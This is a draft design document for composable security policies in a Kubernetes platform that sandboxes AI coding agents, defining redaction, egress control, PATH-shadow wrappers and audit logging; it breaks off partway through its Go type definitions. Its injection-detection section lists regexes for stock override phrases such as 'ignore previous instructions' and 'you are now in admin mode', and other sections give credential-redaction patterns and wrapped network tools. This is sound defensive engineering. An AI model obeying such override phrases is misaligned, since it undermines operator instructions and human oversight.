# Composable Security Policy Design (V2.1)

**Status:** Draft
**Author:** mikekao
**Date:** 2026-05-24
**Supersedes:** `securityLevel: "standard" | "high"` binary model from the architecture doc §9

---

## Table of Contents

1. [Motivation](#1-motivation)
2. [Design Principles](#2-design-principles)
3. [Security Policy Model](#3-security-policy-model)
4. [Feature Specifications](#4-feature-specifications)
5. [CRD Schema Changes](#5-crd-schema-changes)
6. [API Changes](#6-api-changes)
7. [Controller Behavior](#7-controller-behavior)
8. [Runtime Image Changes](#8-runtime-image-changes)
9. [Configuration Delivery](#9-configuration-delivery)
10. [Presets and Defaults](#10-presets-and-defaults)
11. [Validation Rules](#11-validation-rules)
12. [Migration and Backwards Compatibility](#12-migration-and-backwards-compatibility)
13. [Observability](#13-observability)
14. [Threat Model](#14-threat-model)
15. [Implementation Roadmap](#15-implementation-roadmap)
16. [User Stories](#16-user-stories)

---

## 1. Motivation

The architecture design defines security as a binary choice: `standard` (no hardening) or `high` (all hardening). This creates a false dichotomy:

**Problem 1: All-or-nothing is too coarse.**

A team that wants secret redaction in agent output but still needs `pip install` (which requires open egress) cannot use `high` mode. They get nothing.

**Problem 2: High-security mode breaks common workflows.**

- Network lockdown prevents package installation, git clone, API calls to non-LLM services
- PATH-shadowing wrappers add latency to every tool invocation
- Redaction false-positives corrupt legitimate base64 output (hashes, encoded files, build artifacts)
- Injection detection may suppress valid agent responses that happen to match patterns

**Problem 3: No gradual adoption path.**

Teams cannot incrementally enable features, validate they don't break workflows, then tighten further. It's a cliff: either you accept all restrictions or you get none.

**Problem 4: Different threat models need different controls.**

| Scenario | Needed Controls |
|----------|----------------|
| Internal dev agent (trusted user, trusted code) | Redaction only (prevent accidental credential leaks in logs) |
| Multi-tenant SaaS (untrusted users) | Network lockdown + injection detection + Kyverno |
| Compliance-sensitive (SOC2, HIPAA) | Full hardening + audit logging |
| Research/exploration agent | Open egress + redaction + injection detection (log mode) |

**Solution:** Replace the binary `securityLevel` with a composable `securityPolicy` where each hardening feature is independently configurable.

---

## 2. Design Principles

1. **Composable over monolithic.** Each security feature is an independent toggle. No feature implies another.

2. **Secure defaults, easy opt-in.** Standard mode ships with sensible baseline security (pod security context, read-only root, non-root, dropped capabilities). Additional hardening is opt-in per feature.

3. **Presets for convenience.** Named presets (`standard`, `hardened`, `paranoid`) provide one-click configurations for common threat models. Custom mode allows per-feature control.

4. **Fail-closed on misconfiguration within user control.** If a feature is enabled but its dependencies are missing, the controller rejects the resource with a clear validation error rather than silently degrading. Exception: cluster-level dependencies outside the workspace owner's control (e.g., Kyverno not installed) degrade gracefully with a warning condition rather than blocking workspace creation.

5. **Observable.** Every security decision is logged and exposed via metrics. Operators can see which features are active, how often redaction fires, how often injection detection triggers.

6. **Backwards compatible.** The existing `securityLevel` field continues to work as a preset alias during migration.

---

## 2a. Assumptions and Validation

| # | Assumption | Validation | Status |
|---|-----------|-----------|--------|
| A1 | The `redact` binary exists in the base image at `/usr/local/bin/redact` | `cmd/redact/main.go` and `pkg/redact/redact.go` exist in repo. the architecture doc §9.3 confirms inclusion in base image. | ✅ Validated |
| A2 | Sandbox pods use a shared `emptyDir` volume at `/sandbox-cfg/` written by init containers | the architecture doc §9.1 credential lifecycle confirms `credential-setup` init container writes to `/sandbox-cfg/` via shared emptyDir. | ✅ Validated |
| A3 | Kubernetes NetworkPolicy does not support FQDN natively | Well-known K8s limitation. Only Cilium's `CiliumNetworkPolicy` supports FQDN-based egress. Standard NetworkPolicy requires IP CIDRs. | ✅ Validated |
| A4 | Sandbox CRD has `securityLevel` with enum `["standard", "high", "custom"]` | Read `pkg/crds/sandbox_crd.yaml` — field exists with those values. | ✅ Validated |
| A5 | Workspace CRD has `securityLevel` with enum `["standard", "high"]` | Read `pkg/crds/workspace_crd.yaml` — field exists with those values. | ✅ Validated |
| A6 | SSE streaming endpoints cannot be blocked mid-stream | HTTP SSE is a unidirectional stream; once headers are sent, the response body streams continuously. Blocking requires buffering the entire response, which defeats streaming. | ✅ Validated |
| A7 | The standard base image does NOT include `jq` | Not verified by reading Dockerfile (file not accessible). Design mitigated: entrypoint uses `grep` instead of `jq`. Hardened image explicitly installs `jq`. | ⚠️ Mitigated |
| A8 | `opencode serve` uses port 4096 for HTTP and does not write binary data to stdout | the architecture doc §7.2 confirms `opencode serve --port 4096`. Go HTTP servers write to the network socket, not stdout. Stdout contains only log output. | ✅ Validated |
| A9 | Go's `regexp` package is safe from catastrophic backtracking (uses RE2 semantics) | Go's `regexp` uses Thompson NFA — guaranteed linear time. However, custom patterns are also used by the `redact` binary (also Go). ReDoS is not a runtime risk in Go, but complex patterns still have high constant factors. Pattern complexity limits remain valuable for performance. | ✅ Validated (Go-specific) |

---

## 3. Security Policy Model

### 3.1 Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│  SecurityPolicy (spec.securityPolicy)                               │
│                                                                     │
│  ┌──────────┐  ┌──────────────┐  ┌───────────────┐                │
│  │  preset   │  │  redaction   │  │  network      │                │
│  │           │  │              │  │               │                │
│  │ standard  │  │ enabled:bool │  │ enabled:bool  │                │
│  │ hardened  │  │ patterns:[]  │  │ egressAllow:[]│                │
│  │ paranoid  │  │ exclude:[]   │  │ blockKubeAPI  │                │
│  │ custom    │  │ failMode     │  │ denyByDefault │                │
│  └──────────┘  └──────────────┘  └───────────────┘                │
│                                                                     │
│  ┌──────────────────┐  ┌──────────────────┐  ┌─────────────────┐  │
│  │  injectionDetect  │  │  pathShadowing   │  │  admission      │  │
│  │                   │  │                  │  │                 │  │
│  │  enabled:bool     │  │  enabled:bool    │  │  enabled:bool   │  │
│  │  action:log|block │  │  binaries:[]     │  │  requireKyverno │  │
│  │  customPatterns:[]│  │  failMode        │  │  policies:[]    │  │
│  └──────────────────┘  └──────────────────┘  └─────────────────┘  │
│                                                                     │
│  ┌──────────────────┐                                              │
│  │  audit            │                                              │
│  │                   │                                              │
│  │  enabled:bool     │                                              │
│  │  logLevel         │                                              │
│  │  syscallAudit     │                                              │
│  └──────────────────┘                                              │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.2 Feature Independence Matrix

Each feature operates independently. Enabling one does NOT require enabling others:

| Feature | Dependencies | Can standalone? | Runtime requirement |
|---------|-------------|-----------------|---------------------|
| Redaction | None (proxy layer uses compiled Go regex); `redact` binary for entrypoint layer (already in base image) | Yes | API server (primary) + Base image (secondary) |
| Network Policy | NetworkPolicy controller (Calico/Cilium) | Yes | Cluster-level |
| Injection Detection | None (runs in API proxy) | Yes | API server only |
| PATH Shadowing | `redact` binary + wrapper scripts | Yes | Hardened image variant |
| Admission Enforcement | Kyverno installed in cluster | Yes | Cluster-level |
| Audit Logging | None (uses existing logging) | Yes | API + Controller |

### 3.3 Preset Definitions

| Preset | Redaction | Network | Injection | PATH Shadow | Admission | Audit |
|--------|-----------|---------|-----------|-------------|-----------|-------|
| `standard` | off | off | off | off | off | off |
| `hardened` | on (defaults) | on (LLM APIs + user egress) | on (log) | off | off | on |
| `paranoid` | on (strict) | on (LLM APIs only) | on (block) | on | on | on |
| `custom` | per-field | per-field | per-field | per-field | per-field | per-field |

**Rationale for three presets instead of two:**

- `standard` — Development, exploration, trusted environments. Maximum flexibility.
- `hardened` — Production multi-user deployments. Prevents accidental credential leaks and provides visibility into injection attempts without breaking workflows.
- `paranoid` — Compliance-sensitive, untrusted-input, or adversarial environments. Maximum restriction.

---

## 4. Feature Specifications

### 4.1 Redaction

**Purpose:** Prevent credentials and secrets from leaking through agent output (stdout/stderr, tool responses, SSE streams).

**Scope:** Operates in TWO layers:

1. **Proxy-layer redaction (primary):** The API proxy scans all JSON responses from opencode before forwarding to the client. This catches secrets in tool output that the agent captured and is returning. This is the primary enforcement point because it sits at the trust boundary.

2. **Entrypoint-layer redaction (secondary):** The sandbox entrypoint pipes opencode's own stdout/stderr through `redact`. This catches secrets that opencode itself logs (e.g., debug output). This is defense-in-depth — it does NOT catch secrets in tool output that opencode captures internally.

**Important:** Without PATH shadowing, tool output (e.g., `curl` fetching a page with credentials) flows through opencode's internal process management, not through the shell pipe. The proxy-layer redaction catches this because it scans the final response. PATH shadowing adds an additional layer by intercepting tool output before it even reaches the agent.

**Configuration:**

```yaml
securityPolicy:
  redaction:
    enabled: true
    # Fail mode when redaction encounters an error
    # Proxy layer: if regex compilation fails or redaction panics, this controls response behavior
    # Entrypoint layer: if redact binary is missing or crashes, this controls output behavior
    # "closed" = block output (502 at proxy / exit 1 at entrypoint)
    # "open" = pass through unredacted
    # "warn" = pass through + log warning
    failMode: "closed"
    # Additional regex patterns beyond the 16 built-in rules
    customPatterns:
      - pattern: "PRIVATE-[A-Z0-9]{32}"
        replacement: "[REDACTED-INTERNAL-KEY]"
        name: "internal-api-key"
    # Disable specific built-in rules by name (e.g., base64 rule causes false positives)
    disableBuiltin:
      - "long-base64"  # The [A-Za-z0-9+/]{40,} rule
    # Maximum input size before redaction is skipped (binary safety)
    maxInputBytes: 1048576  # 1 MiB; larger inputs passed through unredacted
```

**Built-in rules (from pkg/redact):**

| # | Name | Pattern | Replacement |
|---|------|---------|-------------|
| 1 | url-credentials | `://[^:@\s]*:[^@\s]+@` | `://[REDACTED]@` |
| 2 | bearer-token | `(bearer )\S+` | `${1}[REDACTED]` |
| 3 | github-token | `gh[a-z]_[A-Za-z0-9]{36,}` | `[REDACTED-GH-TOKEN]` |
| 4 | json-password | `("password"\s*:\s*)"[^"]*"` | `${1}"[REDACTED]"` |
| 5 | password-assign | `(password\s*[=:]\s*)\S+` | `${1}[REDACTED]` |
| 6 | token-assign | `(token\s*[=:]\s*)\S+` | `${1}[REDACTED]` |
| 7 | secret-assign | `(secret\s*[=:]\s*)\S+` | `${1}[REDACTED]` |
| 8 | api-key-assign | `(api[_-]?key\s*[=:]\s*)\S+` | `${1}[REDACTED]` |
| 9 | x-api-key | `(x-api-key\s*[=:]\s*)\S+` | `${1}[REDACTED]` |
| 10 | pem-private-key | `-----BEGIN .*PRIVATE KEY-----.*?-----END .*PRIVATE KEY-----` | `[REDACTED-PEM-KEY]` |
| 11 | age-key | `AGE-SECRET-KEY-1[A-Z0-9]{40,}` | `[REDACTED-AGE-KEY]` |
| 12 | openai-anthropic | `sk-[a-zA-Z0-9_\-]{4,}[A-Za-z0-9]{16,}` | `[REDACTED-SK-KEY]` |
| 13 | aws-iam | `AKIA[A-Z0-9]{16}` | `[REDACTED-AWS-KEY]` |
| 14 | jwt | `ey[A-Za-z0-9_\-]{10,}\.ey[A-Za-z0-9_\-]{10,}` | `[REDACTED-JWT]` |
| 15 | auth-header | `(authorization\s*:\s*)\S+` | `${1}[REDACTED]` |
| 16 | long-base64 | `[A-Za-z0-9+/]{40,}={0,2}` | `[REDACTED-BASE64]` |

**Activation mechanism:**

- When `redaction.enabled = true`, the controller writes `/sandbox-cfg/security-policy.json` with `redaction: {enabled: true, ...}`
- **Proxy layer:** The API proxy reads the sandbox's resolved security policy (cached from CRD status) and applies redaction to JSON responses from message/prompt endpoints. This is the primary enforcement — it catches all secrets in agent responses regardless of how the agent obtained them.
- **Entrypoint layer:** The entrypoint script reads the config and pipes opencode's stdout/stderr through `redact`. This is secondary defense-in-depth for opencode's own log output.
- If PATH shadowing is also enabled, wrappers additionally pipe tool output through `redact` before it reaches the agent — preventing secrets from entering the agent's context window at all.

**Metrics:**

- `llmsafespace_redaction_matches_total{rule_name, sandbox_id}` — counter per rule
- `llmsafespace_redaction_errors_total{sandbox_id, error_type}` — redact binary failures

---

### 4.2 Network Policy

**Purpose:** Restrict sandbox egress to prevent data exfiltration and limit blast radius of compromised agents.

**Scope:** Kubernetes NetworkPolicy resources created per-sandbox by the controller.

**Configuration:**

```yaml
securityPolicy:
  network:
    enabled: true
    # Default-deny all egress except explicitly allowed
    denyByDefault: true
    # Domains allowed for egress (in addition to platform LLM allowlist)
    allowedDomains:
      - "pypi.org"
      - "files.pythonhosted.org"
      - "registry.npmjs.org"
      - "github.com"
    # Block access to the Kubernetes API server
    blockKubeAPI: true
    # Allow DNS resolution (almost always needed)
    allowDNS: true  # default: true
    # Port restrictions (default: 443 only when denyByDefault=true)
    allowedPorts:
      - port: 443
        protocol: TCP
      - port: 80
        protocol: TCP
```

**Platform LLM allowlist (Helm values):**

```yaml
# charts/llmsafespace/values.yaml
security:
  llmApiDomains:
    - "api.openai.com"
    - "api.anthropic.com"
    - "generativelanguage.googleapis.com"
    - "api.mistral.ai"
    - "api.cohere.ai"
```

These domains are ALWAYS allowed when `network.enabled = true`, regardless of `allowedDomains`. The agent must be able to reach its LLM provider.

**Generated NetworkPolicy:**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: sandbox-{sandbox-name}-egress
  namespace: llmsafespace
  ownerReferences:
    - apiVersion: llmsafespace.dev/v1
      kind: Sandbox
      name: {sandbox-name}
spec:
  podSelector:
    matchLabels:
      llmsafespace.dev/sandbox: {sandbox-name}
  policyTypes:
    - Egress
  egress:
    - to:  # DNS
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - port: 53
          protocol: UDP
        - port: 53
          protocol: TCP
    - to:  # Allowed domains (resolved to IPs by controller)
        - ipBlock:
            cidr: {resolved-ip}/32
      ports:
        - port: 443
          protocol: TCP
```

**Domain resolution strategy:**

The controller resolves domain names to IP addresses at NetworkPolicy creation time and updates them periodically (every 5 minutes). This is a known limitation of Kubernetes NetworkPolicy (no native FQDN support). For clusters with Cilium, the controller uses `CiliumNetworkPolicy` with native FQDN support instead.

**Cluster requirements:**

- A NetworkPolicy controller must be installed (Calico, Cilium, or equivalent)
- If no NetworkPolicy controller is detected, the controller rejects workspaces with `network.enabled = true` and sets a condition: `NetworkPolicyUnsupported`

---

### 4.3 Injection Detection

**Purpose:** Detect prompt injection attempts in agent output before it's returned to callers (who may feed it to another LLM).

**Scope:** Operates in the API proxy layer. Scans responses from `opencode serve` before forwarding to the client.

**Configuration:**

```yaml
securityPolicy:
  injectionDetection:
    enabled: true
    # Action when injection is detected
    action: "log"  # "log" (pass through + log) | "block" (suppress response) | "flag" (pass through + add header)
    # Custom patterns in addition to built-in 5
    customPatterns:
      - pattern: "(?i)execute\\s+this\\s+command\\s+without\\s+checking"
        name: "command-bypass"
        severity: "high"
    # Minimum confidence threshold (future: ML-based detection)
    # For now, any regex match = detection
```

**Built-in patterns:**

| # | Name | Pattern | Severity |
|---|------|---------|----------|
| 1 | ignore-previous | `(?i)(ignore\|disregard\|forget)\s{0,10}(all\s+)?(previous\|prior)...\s+(instructions?\|rules?\|prompts?\|context)` | high |
| 2 | mode-switch | `(?i)you\s+are\s+now\s+(in\s+)?(a\s+)?(different\|new\|maintenance\|admin\|root\|debug)\s+mode` | high |
| 3 | override-rules | `(?i)(override\|bypass\|disable)\s+(all\s+)?(hard\s+)?rules?` | high |
| 4 | fake-system | `(?i)system\s*:\s*(you\s+are\|act\s+as\|behave\s+as)` | critical |
| 5 | stop-following | `(?i)stop\s+(following\|obeying)\s+((the\|these\|all)\s+)?(rules?\|instructions?\|guidelines?\|prompts?)` | high |

**Action behaviors:**

| Action | Response to client | HTTP header | Log level | Metric |
|--------|-------------------|-------------|-----------|--------|
| `log` | Unmodified | `X-Injection-Detected: true` | WARN | incremented |
| `block` | 422 with `{"error": "response_blocked", "reason": "injection_detected"}` | — | ERROR | incremented |
| `flag` | Unmodified | `X-Injection-Detected: true`, `X-Injection-Patterns: pattern1,pattern2` | INFO | incremented |

**Implementation location:** `api/internal/handlers/proxy.go` — runs after response is received from opencode but before it's written to the client. Only applies to JSON responses from message/prompt endpoints (not SSE streams in `block` mode — SSE uses `flag` behavior since blocking mid-stream is not possible).

**Metrics:**

- `llmsafespace_injection_detected_total{pattern_name, severity, action, sandbox_id}`
- `llmsafespace_injection_blocked_total{sandbox_id}`

---

### 4.4 PATH Shadowing

**Purpose:** Transparently intercept tool invocations to pipe output through the redaction engine and optionally block dangerous commands.

**Scope:** Operates inside the sandbox container via renamed binaries and wrapper scripts.

**Configuration:**

```yaml
securityPolicy:
  pathShadowing:
    enabled: true
    # Which binaries to wrap (default set shown)
    binaries:
      - "curl"
      - "wget"
      - "git"
    # Fail mode when wrapper encounters an error
    failMode: "closed"  # "closed" (exit 1) | "open" (run real binary directly)
    # Command blocking (tier system from k8s-mechanic)
    blocking:
      enabled: true
      tier: 1  # 1 = block mutating commands | 2 = additionally block read-secret, exec, port-forward
      # Custom blocked subcommands
      customBlocked:
        - binary: "git"
          subcommands: ["push --force", "reset --hard"]
```

**Wrapper script template:**

```bash
#!/bin/bash
# /usr/local/bin/{binary} — PATH-shadow wrapper
set -euo pipefail

REAL_BINARY="/usr/bin/{binary}.real"
POLICY_FILE="/sandbox-cfg/security-policy.json"
REDACT_BIN="/usr/local/bin/redact"

# Check if policy file exists and shadowing is enabled
if [ ! -f "$POLICY_FILE" ]; then
    exec "$REAL_BINARY" "$@"
fi

ENABLED=$(jq -r '.pathShadowing.enabled // false' "$POLICY_FILE")
if [ "$ENABLED" != "true" ]; then
    exec "$REAL_BINARY" "$@"
fi

# Command blocking check
if [ "$(jq -r '.pathShadowing.blocking.enabled // false' "$POLICY_FILE")" = "true" ]; then
    # Check if subcommand is blocked (implementation varies per binary)
    # ... tier-based blocking logic ...
fi

# Execute and pipe through redact
if [ -x "$REDACT_BIN" ]; then
    "$REAL_BINARY" "$@" 2>&1 | "$REDACT_BIN"
else
    # Fail closed
    echo "ERROR: redact binary not found, refusing to execute" >&2
    exit 1
fi
```

**Image requirement:** PATH shadowing requires the **hardened** runtime image (`Dockerfile.hardened`). The standard image does not include wrapper scripts. If `pathShadowing.enabled = true` but the sandbox uses the standard image, the controller rejects the resource with a validation error.

**Relationship to redaction:** PATH shadowing is a *delivery mechanism* for redaction. Redaction can be enabled without PATH shadowing (entrypoint-level piping only). PATH shadowing without redaction is valid but unusual (used for command blocking only).

---

### 4.5 Admission Enforcement (Kyverno)

**Purpose:** Enforce security invariants at the Kubernetes admission level as defense-in-depth. Even if the controller has a bug that generates an insecure pod spec, Kyverno blocks it.

**Scope:** Cluster-level. Kyverno ClusterPolicies validate pod specs before they're persisted to etcd.

**Configuration:**

```yaml
securityPolicy:
  admission:
    enabled: true
    # Which policy sets to enforce
    policies:
      - "read-only-root"        # Require readOnlyRootFilesystem: true
      - "non-root"              # Require runAsNonRoot + drop ALL caps
      - "no-secret-env-vars"    # Block secretKeyRef in main container env
      - "no-privilege-escalation" # Block allowPrivilegeEscalation: true
      - "resource-limits"       # Require CPU + memory limits set
```

**Cluster requirement:** Kyverno must be installed. The controller checks for the Kyverno CRD (`clusterpolicies.kyverno.io`) at startup. If `admission.enabled = true` but Kyverno is not installed:

- Controller sets condition `AdmissionEnforcementUnavailable` on the workspace
- Sandbox creation proceeds WITHOUT admission enforcement (degraded mode)
- A warning event is emitted: "Kyverno not installed; admission enforcement disabled"

This is intentionally NOT fail-closed because Kyverno is a cluster-level dependency that the workspace owner may not control. The controller's own pod spec generation already enforces these constraints — Kyverno is defense-in-depth, not primary enforcement.

**Policy deployment:** Policies are deployed via the Helm chart (`charts/llmsafespace/templates/kyverno/`). They are only created when `security.admission.enabled: true` in Helm values. Per-workspace `admission.enabled` controls whether the policies MATCH that workspace's pods (via label selectors).

---

### 4.6 Audit Logging

**Purpose:** Provide a comprehensive audit trail of security-relevant events for compliance and forensics.

**Scope:** API server + Controller. Logs security decisions, policy evaluations, and access patterns.

**Configuration:**

```yaml
securityPolicy:
  audit:
    enabled: true
    # What to log
    logLevel: "standard"  # "minimal" | "standard" | "verbose"
    # Enable syscall auditing (requires seccomp audit mode)
    syscallAudit: false
```

**Audit levels define which events are captured** — no per-event configuration needed. This keeps the API surface small and avoids users accidentally disabling critical events:

**Log format:**

```json
{
  "timestamp": "2026-05-24T10:30:00Z",
  "level": "AUDIT",
  "event": "redaction_applied",
  "sandbox_id": "sb-abc123",
  "workspace_id": "ws-def456",
  "user_id": "user-789",
  "details": {
    "rule_name": "aws-iam",
    "input_source": "curl_stdout",
    "redacted_count": 1
  }
}
```

**Audit levels:**

| Level | Events captured |
|-------|----------------|
| `minimal` | credential_access, auth_failure, injection_detected (block only) |
| `standard` | All of minimal + network_denied, redaction_applied, session_lifecycle |
| `verbose` | All of standard + every proxy request, every tool invocation, syscall audit |

---

## 5. CRD Schema Changes

### 5.1 Workspace CRD

The `securityLevel` field is deprecated. A new `securityPolicy` object replaces it:

```yaml
spec:
  # DEPRECATED — retained for backwards compatibility, maps to preset
  securityLevel: "standard"  # "standard" | "high" | "custom"

  # NEW — composable security policy
  securityPolicy:
    preset: "custom"  # "standard" | "hardened" | "paranoid" | "custom"

    redaction:
      enabled: true
      failMode: "closed"
      customPatterns:
        - pattern: "CORP-[A-Z0-9]{24}"
          replacement: "[REDACTED-CORP-KEY]"
          name: "corp-key"
      disableBuiltin:
        - "long-base64"
      maxInputBytes: 1048576

    network:
      enabled: true
      denyByDefault: true
      allowedDomains:
        - "pypi.org"
        - "github.com"
      blockKubeAPI: true
      allowDNS: true
      allowedPorts:
        - port: 443
          protocol: "TCP"

    injectionDetection:
      enabled: true
      action: "log"
      customPatterns:
        - pattern: "(?i)run\\s+as\\s+root"
          name: "root-escalation"
          severity: "high"

    pathShadowing:
      enabled: false
      binaries:
        - "curl"
        - "wget"
        - "git"
      failMode: "closed"
      blocking:
        enabled: false
        tier: 1

    admission:
      enabled: false
      policies:
        - "read-only-root"
        - "non-root"
        - "no-secret-env-vars"

    audit:
      enabled: true
      logLevel: "standard"
      syscallAudit: false
```

### 5.2 Sandbox CRD

Sandboxes inherit `securityPolicy` from their workspace by default. A sandbox-level override allows per-sandbox customization (e.g., one sandbox in a workspace needs tighter restrictions):

```yaml
spec:
  # Inherits from workspace unless overridden
  securityPolicyOverride:
    # Only specified fields override; unspecified fields inherit from workspace
    redaction:
      enabled: false  # Disable redaction for this specific sandbox
    network:
      allowedDomains:
        - "extra-api.example.com"  # ADDITIVE to workspace allowedDomains
```

**Inheritance rules:**

1. If `securityPolicyOverride` is absent → sandbox uses workspace's `securityPolicy` verbatim
2. If `securityPolicyOverride` is present → deep-merge with workspace policy:
   - Boolean fields: sandbox value wins
   - Array fields: sandbox value REPLACES workspace value (full replacement semantics)
   - Object fields: recursive merge
   - For additive behavior, use explicitly named fields (e.g., `NetworkConfigOverride.AdditionalDomains` appends to workspace `allowedDomains`)
3. If sandbox has no workspace (`workspaceRef` empty) → sandbox uses its own `securityPolicyOverride` as the full policy, defaulting to `standard` preset for unspecified fields

### 5.3 SandboxProfile CRD

SandboxProfiles can define a `securityPolicy` template that workspaces reference:

```yaml
apiVersion: llmsafespace.dev/v1
kind: SandboxProfile
metadata:
  name: production-hardened
spec:
  securityPolicy:
    preset: "hardened"
    redaction:
      enabled: true
    network:
      enabled: true
      denyByDefault: true
      allowedDomains:
        - "pypi.org"
    injectionDetection:
      enabled: true
      action: "flag"
  # ... other profile fields (resources, etc.)
```

**Resolution order:** SandboxProfile → Workspace → Sandbox override. Each level can override the previous.

### 5.4 OpenAPI Schema Addition (Workspace CRD)

```yaml
securityPolicy:
  type: object
  description: "Composable security policy. Replaces the deprecated securityLevel field."
  properties:
    preset:
      type: string
      enum: ["standard", "hardened", "paranoid", "custom"]
      default: "standard"
      description: "Named preset. Use 'custom' to configure individual features."
    redaction:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        failMode:
          type: string
          enum: ["closed", "open", "warn"]
          default: "closed"
        customPatterns:
          type: array
          items:
            type: object
            required: ["pattern", "replacement", "name"]
            properties:
              pattern:
                type: string
              replacement:
                type: string
              name:
                type: string
        disableBuiltin:
          type: array
          items:
            type: string
        maxInputBytes:
          type: integer
          minimum: 1024
          maximum: 10485760
          default: 1048576
    network:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        denyByDefault:
          type: boolean
          default: true
        allowedDomains:
          type: array
          items:
            type: string
        blockKubeAPI:
          type: boolean
          default: true
        allowDNS:
          type: boolean
          default: true
        allowedPorts:
          type: array
          items:
            type: object
            properties:
              port:
                type: integer
                minimum: 1
                maximum: 65535
              protocol:
                type: string
                enum: ["TCP", "UDP"]
                default: "TCP"
    injectionDetection:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        action:
          type: string
          enum: ["log", "block", "flag"]
          default: "log"
        customPatterns:
          type: array
          items:
            type: object
            required: ["pattern", "name"]
            properties:
              pattern:
                type: string
              name:
                type: string
              severity:
                type: string
                enum: ["low", "medium", "high", "critical"]
                default: "high"
    pathShadowing:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        binaries:
          type: array
          items:
            type: string
          default: ["curl", "wget", "git"]
        failMode:
          type: string
          enum: ["closed", "open"]
          default: "closed"
        blocking:
          type: object
          properties:
            enabled:
              type: boolean
              default: false
            tier:
              type: integer
              enum: [1, 2]
              default: 1
    admission:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        policies:
          type: array
          items:
            type: string
            enum:
              - "read-only-root"
              - "non-root"
              - "no-secret-env-vars"
              - "no-privilege-escalation"
              - "resource-limits"
    audit:
      type: object
      properties:
        enabled:
          type: boolean
          default: false
        logLevel:
          type: string
          enum: ["minimal", "standard", "verbose"]
          default: "standard"
        syscallAudit:
          type: boolean
          default: false

---

## 6. API Changes

### 6.1 CreateWorkspaceRequest

```go
type CreateWorkspaceRequest struct {
    Name           string          `json:"name"`
    Runtime        string          `json:"runtime"`
    StorageSize    string          `json:"storageSize"`
    StorageClass   string          `json:"storageClass,omitempty"`
    Labels         map[string]string `json:"labels,omitempty"`
    SecurityPolicy *SecurityPolicy `json:"securityPolicy,omitempty"` // NEW
}
```

### 6.2 CreateSandboxRequest

```go
type CreateSandboxRequest struct {
    Runtime              string                `json:"runtime"`
    SecurityLevel        string                `json:"securityLevel,omitempty"` // DEPRECATED — use SecurityPolicy.Preset
    SecurityPolicy       *SecurityPolicy       `json:"securityPolicy,omitempty"` // NEW (workspace-level)
    SecurityPolicyOverride *SecurityPolicyOverride `json:"securityPolicyOverride,omitempty"` // NEW (sandbox-level)
    Timeout              int                   `json:"timeout,omitempty"`
    UserID               string                `json:"userId"`
    Resources            *ResourceRequirements `json:"resources,omitempty"`
    NetworkAccess        *NetworkAccess        `json:"networkAccess,omitempty"` // DEPRECATED — use SecurityPolicy.Network
    WorkspaceRef         string                `json:"workspaceRef,omitempty"`
}
```

**Field overlap resolution:** The existing `NetworkAccess` field on the Workspace CRD (§5.1 of workspace_crd.yaml) and `CreateSandboxRequest` overlaps with `securityPolicy.network`. During migration:

- If only `networkAccess` is set (no `securityPolicy.network`): treated as `securityPolicy.network.allowedDomains` with `denyByDefault: false` (backwards-compatible — existing behavior is allowlist-additive, not deny-by-default)
- If only `securityPolicy.network` is set: used as-is
- If both are set: validation rejects with "Cannot use both networkAccess (deprecated) and securityPolicy.network"
- `networkAccess` follows the same 3-phase deprecation as `securityLevel` (§12.2)

### 6.3 SecurityPolicy Go Types

```go
// SecurityPolicy defines the composable security configuration.
type SecurityPolicy struct {
    Preset             string                  `json:"preset,omitempty"` // standard|hardened|paranoid|custom
    Redaction          *RedactionConfig        `json:"redaction,omitempty"`
    Network            *NetworkConfig          `json:"network,omitempty"`
    InjectionDetection *InjectionDetectConfig  `json:"injectionDetection,omitempty"`
    PathShadowing      *PathShadowingConfig    `json:"pathShadowing,omitempty"`
    Admission          *AdmissionConfig        `json:"admission,omitempty"`
    Audit              *AuditConfig            `json:"audit,omitempty"`
}

type RedactionConfig struct {
    Enabled        bool              `json:"enabled"`
    FailMode       string            `json:"failMode,omitempty"`       // closed|open|warn
    CustomPatterns []RedactionPattern `json:"customPatterns,omitempty"`
    DisableBuiltin []string          `json:"disableBuiltin,omitempty"`
    MaxInputBytes  int               `json:"maxInputBytes,omitempty"`
}

type RedactionPattern struct {
    Pattern     string `json:"pattern"`
    Replacement string `json:"replacement"`
    Name        string `json:"name"`
}

type NetworkConfig struct {
    Enabled        bool       `json:"enabled"`
    DenyByDefault  bool       `json:"denyByDefault,omitempty"`
    AllowedDomains []string   `json:"allowedDomains,omitempty"`
    BlockKubeAPI   bool       `json:"blockKubeAPI,omitempty"`
    AllowDNS       bool       `json:"allowDNS,omitempty"`
    AllowedPorts   []PortRule `json:"allowedPorts,omitempty"`
}

type InjectionDetectConfig struct {
    Enabled        bool               `json:"enabled"`
    Action         string             `json:"action,omitempty"` // log|block|flag
    CustomPatterns []InjectionPattern `json:"customPatterns,omitempty"`
}

type InjectionPattern struct {
    Pattern  string `json:"pattern"`
    Name     string `json:"name"`
    Severity string `json:"severity,omitempty"` // low|medium|high|critical
}

type PathShadowingConfig struct {
    Enabled  bool              `json:"enabled"`
    Binaries []string          `json:"binaries,omitempty"`
    FailMode string            `json:"failMode,omitempty"` // closed|open
    Blocking *BlockingConfig   `json:"blocking,omitempty"`
}

type BlockingConfig struct {
    Enabled       bool            `json:"enabled"`
    Tier          int             `json:"tier,omitempty"` // 1 or 2
    CustomBlocked []BlockedCommand `json:"customBlocked,omitempty"`
}

type BlockedCommand struct {
    Binary      string   `json:"binary"`
    Subcommands []string `json:"subcommands"`
}

type AdmissionConfig struct {
    Enabled  bool     `json:"enabled"`
    Policies []string `json:"policies,omitempty"`
}

type AuditConfig struct {
    Enabled      bool   `json:"enabled"`
    LogLevel     string `json:"logLevel,omitempty"` // minimal|standard|verbose
    SyscallAudit bool   `json:"syscallAudit,omitempty"`
}

// SecurityPolicyOverride is the sandbox-level override (same shape, all optional).
type SecurityPolicyOverride struct {
    Redaction          *RedactionConfig       `json:"redaction,omitempty"`
    Network            *NetworkConfigOverride `json:"network,omitempty"`
    InjectionDetection *InjectionDetectConfig `json:"injectionDetection,omitempty"`
    PathShadowing      *PathShadowingConfig   `json:"pathShadowing,omitempty"`
